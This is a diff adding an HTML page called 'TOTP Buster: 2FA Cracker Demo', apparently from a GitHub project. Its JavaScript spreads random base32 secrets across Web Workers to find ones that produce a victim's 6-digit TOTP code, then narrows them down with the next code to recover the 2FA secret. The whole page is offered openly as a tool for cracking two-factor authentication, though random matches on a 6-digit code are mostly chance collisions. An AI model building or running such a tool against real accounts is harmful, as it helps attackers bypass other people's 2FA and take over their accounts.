@@ -1,0 +1,179 @@
+<html>
+  <head>
+    <title>TOTP Buster</title>
+    <style>
+      body {
+        margin: auto;
+        font-family: Tahoma, Verdana, Arial, sans-serif;
+        text-align: center;
+        width: 50em;
+      }
+      p {
+        display: inline-flex;
+        width: 15em;
+      }
+      form {
+        text-align: left;
+      }
+      li {
+        margin: 1em 5em;
+        text-align: left;
+      }
+    </style>
+    <script src="./jsotp.min.js"></script>
+  </head>
+
+  <body>
+    <div>
+      <h1 id="jsotp-demo">TOTP Buster: 2FA Cracker Demo</h1>
+      <form>
+        2FA: <input id="iKey" placeholder="000000" /> Thread: <input id="iThr" placeholder="128" /> Offset:
+        <input id="iTime" placeholder="" />
+        <input type="button" value="Start" onclick="start()" />
+      </form>
+      <form>
+        2FA: <input id="cKey" placeholder="000000" /> Offset: <input id="cTime" placeholder="" /> Correct:
+        <input id="cSec" disabled placeholder="" />
+        <input type="button" value="Check" onclick="check()" />
+      </form>
+    </div>
+    <div>
+      <p>2FA:</p>
+      <p>Time:</p>
+      <p>Secret:</p>
+    </div>
+    <hr />
+    <div id="output">
+      <li>Give a target 2FA (default is time now or spacial it by yourself) in and hit [Start].</li>
+      <li>Here will list some 2FA numbers and secret data (more than one) when busting.</li>
+      <li>Waiting timeout(30s) and check it if the 2FA in list is correct at next by self.</li>
+      <li>Or you are already got next 2FA? put it in next line and hit [Check] to watching it.</li>
+      <li>Have a cup of "java" and wish it can success in oneshot :P (Good luck!)</li>
+    </div>
+    <hr />
+    <div>
+      <p id="ticker"></p>
+      <p id="speed"></p>
+      <p><a href="https://github.com/deepwn/totpBuster">https://github.com/deepwn/totpBuster</a></p>
+    </div>
+
+    <script>
+      // vender
+      function randStr(len = 16) {
+        var $chars = "ABCDEFGHJKMNPQRSTWXYZ234567";
+        var maxPos = $chars.length;
+        var out = "";
+        for (i = 0; i < len; i++) {
+          out += $chars.charAt(Math.floor(Math.random() * maxPos));
+        }
+        return out;
+      }
+
+      $ = function (sel) {
+        return document.querySelector(sel);
+      };
+
+      function updateDom(data, el, type = "innerText") {
+        el[type] = data;
+      }
+
+      function timeLoop() {
+        var epoch = Math.round(new Date().getTime() / 1000.0);
+        var now = new Date().getTime();
+        var countDown = 30 - (epoch % 30);
+        updateDom(countDown, $("#ticker"));
+        updateDom(speed + "/s", $("#speed"));
+        speed = 0;
+        $("#iTime").placeholder = now;
+        $("#cTime").placeholder = now;
+        if (countDown === 30) {
+          document.querySelectorAll("div[secret]").forEach((el) => {
+            el.querySelector("p#key").innerText = totp.getOtp(el.getAttribute("secret"));
+            el.querySelector("p#time").innerText = now;
+          });
+        }
+      }
+
+      function check() {
+        checkLoop();
+        setInterval(checkLoop, 1000);
+      }
+
+      function checkLoop() {
+        checkKey = document.querySelector("#cKey").value || null;
+        if (checkKey) {
+          let time = document.querySelector("#cTime").value || new Date().getTime();
+          document.querySelector("#cTime").value = time;
+          let cKey = document.querySelector("#cKey").value || null;
+          document.querySelectorAll("div[secret]").forEach((el) => {
+            let secret = el.getAttribute("secret");
+            let tKey = totp.getOtp(secret, time);
+            if (checkKey === tKey) {
+              document.querySelector("#cSec").value = secret;
+              document.querySelector("#cSec").removeAttribute("disabled");
+              stop();
+            }
+          });
+        }
+      }
+
+      function start(params) {
+        let num = document.querySelector("#iThr").value || document.querySelector("#iThr").placeholder;
+        document.querySelector("#iThr").value = num;
+        let now =
+          document.querySelector("#iTime").value ||
+          document.querySelector("#iTime").placeholder ||
+          new Date().getTime();
+        document.querySelector("#iTime").value = now;
+        let targetKey = document.querySelector("#iKey").value || null;
+        if (targetKey) {
+          jobs = workerPool(num, now, targetKey);
+        }
+      }
+
+      function stop() {
+        for (let i = 0; i < jobs.length; i++) {
+          output.innerHTML = "<p>Buster stopped...</p>";
+          jobs[i].worker.terminate();
+        }
+      }
+
+      function workerPool(num, now, targetKey) {
+        let pool = [];
+        updateDom("", $("#output"));
+        let output = document.createElement("div");
+        output.innerHTML = "<p id='key'></p><p id='time'></p><p></p>";
+        document.querySelector("#output").appendChild(output);
+        for (let i = 0; i < num; i++) {
+          pool[i] = {};
+          pool[i].secret = randStr();
+          pool[i].worker = new Worker("./worker.js");
+          pool[i].worker.onmessage = (event) => {
+            speed++;
+            output.querySelectorAll("p")[0].innerText = event.data;
+            output.querySelectorAll("p")[1].innerText = now;
+            output.querySelectorAll("p")[2].innerText = pool[i].secret;
+            if (event.data === targetKey && !document.querySelector(`div[key="${targetKey}"]`)) {
+              output.setAttribute("key", event.data);
+              output.setAttribute("secret", pool[i].secret);
+              output = document.createElement("div");
+              output.innerHTML = "<p id='key'></p><p id='time'></p><p></p>";
+              document.querySelector("#output").appendChild(output);
+            }
+            pool[i].secret = randStr();
+            pool[i].worker.postMessage(pool[i].secret);
+          };
+          pool[i].worker.postMessage(pool[i].secret);
+        }
+        return pool;
+      }
+      // start
+      var speed = 0;
+      var jobs = null;
+      var totp = new jsOTP.totp();
+
+      var secret = randStr();
+      setInterval(timeLoop, 1000);
+    </script>
+  </body>
+</html>
